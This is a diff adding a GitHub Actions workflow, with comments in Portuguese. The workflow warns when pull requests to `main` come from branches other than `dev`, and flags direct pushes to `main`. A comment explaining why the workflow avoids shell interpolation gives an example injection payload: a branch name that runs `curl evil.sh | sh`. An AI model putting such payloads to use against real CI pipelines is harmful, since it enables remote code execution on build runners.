@@ -1,0 +1,163 @@
+# A regra de branch, com dentes.
+#
+# Este repositório tem DUAS branches permanentes:
+#   `dev`   — desenvolvimento, testes e validação. É a branch padrão.
+#   `main`  — PRODUÇÃO. Só recebe merge de PR vindo da `dev`.
+#
+# POR QUE UM WORKFLOW, E NÃO UMA REGRA DO GITHUB.
+#
+# O caminho natural seria Settings → Rules → Rulesets, exigindo que `main` só
+# aceite PR vindo de `dev`. Em repositório PRIVADO no plano free isso não existe:
+#
+#   GET /repos/{owner}/{repo}/rulesets
+#   → 403 "Upgrade to GitHub Pro or make this repository public to enable this feature."
+#
+# Um workflow funciona sem Pro, porque o Actions roda com a permissão do
+# REPOSITÓRIO e não com a de quem abriu o PR.
+#
+# ⚠️ ELE NÃO IMPEDE O MERGE — sem ruleset, nada impede. Ele reprova o PR em
+# VERMELHO, com o motivo escrito. Quem mergear por cima está fazendo uma escolha
+# consciente em vez de um descuido, e a escolha fica registrada. Se um dia o
+# repositório virar Pro ou público, marque `origem-do-pr` como check obrigatório
+# e a regra passa a valer de verdade.
+#
+# ⚠️ ESTE ARQUIVO PRECISA EXISTIR NAS DUAS BRANCHES.
+# Num evento `pull_request` o GitHub roda os workflows da árvore MESCLADA
+# (head + base). Um PR vindo de uma branch que não tem este arquivo só é pego
+# porque a base — a `main` — o tem.
+
+name: Fluxo de branches
+
+on:
+  pull_request:
+    # `labeled`/`unlabeled` não são opcionais: `edited` cobre título e corpo,
+    # NÃO rótulo. Sem eles, pôr o `hotfix-aprovado` num PR já reprovado não
+    # redispara nada — o X continua vermelho, a válvula de emergência parece
+    # quebrada bem na hora em que alguém precisa dela, e a saída seria mergear
+    # por cima do vermelho, que é o hábito que este arquivo existe para evitar.
+    # `unlabeled` fecha o outro lado: TIRAR o rótulo tem de voltar a reprovar.
+    types: [opened, reopened, synchronize, edited, labeled, unlabeled]
+    branches: [main]
+  push:
+    branches: [main]
+
+# Menor privilégio: este workflow só lê.
+permissions:
+  contents: read
+
+jobs:
+  # ───────────────────────────────────────────────────────────────────────────
+  # A guarda: PR para `main` só pode vir de `dev`.
+  # ───────────────────────────────────────────────────────────────────────────
+  origem-do-pr:
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+
+    steps:
+      - name: A origem tem de ser `dev`
+        env:
+          # Por variável de ambiente, e NUNCA interpolado direto no `run`: nome
+          # de branch é texto que quem abre o PR controla, e `${{ }}` dentro de
+          # um shell é injeção de comando. Uma branch chamada
+          # `x"; curl evil.sh | sh; #` executaria no runner.
+          ORIGEM: ${{ github.head_ref }}
+          ROTULOS: ${{ join(github.event.pull_request.labels.*.name, ',') }}
+        run: |
+          echo "PR de '$ORIGEM' para 'main'."
+
+          if [ "$ORIGEM" = "dev" ]; then
+            echo "✅ Origem correta."
+            exit 0
+          fi
+
+          # A válvula de emergência. Produção quebrada às 2h da manhã não pode
+          # esperar um ciclo inteiro por `dev` — mas o desvio tem de deixar
+          # rastro, e um rótulo deixa: fica no histórico, com quem o pôs e quando.
+          case ",$ROTULOS," in
+            *,hotfix-aprovado,*)
+              echo "⚠️  Origem '$ORIGEM' não é 'dev', mas o PR tem o rótulo"
+              echo "    'hotfix-aprovado'. Liberado como emergência."
+              echo "    Depois do merge, traga a main de volta para a dev:"
+              echo "      git checkout dev && git merge main && git push origin dev"
+              exit 0
+              ;;
+          esac
+
+          cat <<'RECADO'
+          ❌ Este PR não pode ir para `main`.
+
+          `main` é PRODUÇÃO. A única branch que promove para ela é `dev`.
+
+          O que fazer:
+            1. Feche este PR.
+            2. Mande o seu trabalho para `dev`:
+                 git checkout dev
+                 git pull origin dev
+                 git merge SUA-BRANCH        # ou: git rebase dev
+                 git push origin dev
+            3. Quando `dev` estiver validada e for hora de subir para produção,
+               abra UM PR de `dev` para `main`.
+
+          Emergência de produção? Ponha o rótulo `hotfix-aprovado` neste PR e
+          este job libera — mas o desvio fica registrado.
+
+          A regra inteira está em CONTRIBUTING.md.
+          RECADO
+          exit 1
+
+  # ───────────────────────────────────────────────────────────────────────────
+  # O alarme de fumaça: alguém empurrou direto na `main`.
+  #
+  # Não tranca — sem ruleset, NADA tranca um push direto, e escrever aqui que
+  # tranca seria promessa falsa. O que ele faz é transformar um push silencioso
+  # num job VERMELHO na aba Actions e num e-mail. Violação que ninguém vê vira
+  # hábito; violação que acende luz, não.
+  # ───────────────────────────────────────────────────────────────────────────
+  push-direto:
+    if: github.event_name == 'push'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+
+    steps:
+      - name: Baixar o código
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          # Precisa dos dois pais para saber se o commit é um merge.
+          fetch-depth: 2
+
+      # Aspas obrigatórias: crase é caractere RESERVADO em YAML e um escalar não
+      # pode começar com ela. Sem as aspas o arquivo inteiro não parseia, e o
+      # GitHub reporta "workflow inválido" — a guarda simplesmente não roda, em
+      # silêncio, que é o pior modo de falha para uma tranca.
+      - name: "`main` só deveria receber merge de `dev`"
+        run: |
+          PAIS=$(git rev-list --parents -n 1 HEAD | wc -w)
+
+          # 3 palavras = o commit + 2 pais = merge commit. É o que um PR
+          # mergeado produz. Squash tem 1 pai só, e cai no aviso abaixo.
+          if [ "$PAIS" -ge 3 ]; then
+            echo "✅ Merge commit. É o formato que um PR de \`dev\` produz."
+            exit 0
+          fi
+
+          echo "::warning title=Push direto na main::Um commit de pai único chegou à main sem passar por merge de PR."
+          cat <<'RECADO'
+          ⚠️  Commit de pai único na `main`.
+
+          Isto é o que um `git push origin main` direto parece. Também é o que
+          um PR mergeado com "Squash and merge" parece — então este aviso NÃO é
+          prova de violação, é um pedido de conferência.
+
+          Se foi push direto: `main` é produção e o combinado é que ela só
+          receba promoção de `dev`. Traga a mudança para a `dev` também, senão
+          o próximo merge de `dev` vai conflitar ou desfazer o que você acabou
+          de subir:
+
+            git checkout dev && git merge main && git push origin dev
+
+          A regra inteira está em CONTRIBUTING.md.
+          RECADO
+          # Sai 0 de propósito: um squash-merge legítimo cai aqui, e reprovar a
+          # main por causa dele treinaria a equipe a ignorar o vermelho.
+          exit 0
